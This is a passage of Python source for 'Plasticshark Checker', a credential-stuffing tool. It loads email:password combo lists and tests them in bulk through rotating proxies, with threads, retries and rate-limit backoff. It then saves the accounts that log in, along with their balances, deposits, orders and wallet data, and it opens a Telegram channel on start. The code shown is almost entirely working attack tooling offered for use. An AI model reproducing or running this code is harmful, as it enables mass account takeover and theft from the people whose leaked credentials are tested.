        if DEBUG:
            Eyelifter_out(f"[{done}/{total}] {combo.split(':')[0]} - err ({et})")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    Eyelifter_out(f"[RECORD-FAIL] {combo[:30]}: {e}")

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "empty"):
        u = result.get("user", {}) or {}
        verdict = "✅ HIT" if result["status"] == "hit" else "🔓 EMPTY"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("Balance", u.get("balance", "-")),
            ("Total Deposits", u.get("total_deposits", "-")),
            ("Orders Total", u.get("orders_total", "-")),
            ("Orders Pending", u.get("orders_pending", "-")),
            ("Orders Delivered", u.get("orders_delivered", "-")),
            ("Deadline", u.get("deadline", "-")),
            ("Action Required", "Yes" if u.get("action_required") else "No"),
            ("Order Rows", str(u.get("order_count", 0))),
            ("Wallet Rows", str(u.get("wallet_count", 0))),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_active_f
    global _eyelifter_empty_f, _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies
    global _eyelifter_progress_thread

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "plastic_hits.txt"), "w", encoding="utf-8")
    _eyelifter_empty_f = open(os.path.join(_eyelifter_folder, "plastic_empty.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "plastic_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "plastic_errors.txt"), "w", encoding="utf-8")

    header = (f"# Plasticshark Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_empty_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_empty_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad_proxies = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    _eyelifter_progress_stop.clear()
    _eyelifter_progress_thread[0] = threading.Thread(
        target=Eyelifter_progress_loop, daemon=True
    )
    _eyelifter_progress_thread[0].start()

    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        _eyelifter_progress_stop.set()
        if _eyelifter_progress_thread[0]:
            _eyelifter_progress_thread[0].join(timeout=1.5)
        for fh in (_eyelifter_hits_f, _eyelifter_empty_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("plastic_hits.txt", "hits"),
        ("plastic_empty.txt", "empty"),
        ("plastic_bad.txt", "bad"),
        ("plastic_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (active)", _eyelifter_stats["hits"]),
        ("Empty (no spend)", _eyelifter_stats["empty"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Fetch Orders:       {CONFIG['fetch_orders']}")
    print(f"  [11] Fetch Wallet:       {CONFIG['fetch_wallet']}")
    print(f"  [12] Debug:              {CONFIG['debug']}")
    print(f"  [13] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(100, int(input("Threads (1-100): "))))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            CONFIG["fetch_orders"] = not CONFIG["fetch_orders"]
            _loader.settings["fetch_orders"] = CONFIG["fetch_orders"]
            changed = True
        elif ch == "11":
            CONFIG["fetch_wallet"] = not CONFIG["fetch_wallet"]
            _loader.settings["fetch_wallet"] = CONFIG["fetch_wallet"]
            changed = True
        elif ch == "12":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]
            changed = True
        elif ch == "13":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Plasticshark Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)